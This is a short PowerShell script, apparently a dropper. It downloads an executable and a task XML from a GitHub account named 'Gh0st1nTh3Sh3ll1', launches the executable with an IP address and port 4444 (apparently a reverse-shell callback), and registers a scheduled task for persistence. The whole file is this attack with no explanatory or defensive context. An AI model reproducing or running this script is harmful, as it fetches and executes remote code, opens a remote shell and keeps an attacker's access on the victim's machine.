$client = new-object System.Net.WebClient
$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.xml'
$file = 'SystemTask.xml'
$client.DownloadFile($url,$file)
$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.exe' 
$file = 'SystemTask.exe'
$client.DownloadFile($url,$file)
iex 'SystemTask.exe "192.168.2.223" "4444"'
iex 'schtasks.exe /create /tn "SystemTask" /xml "SystemTask.xml"'
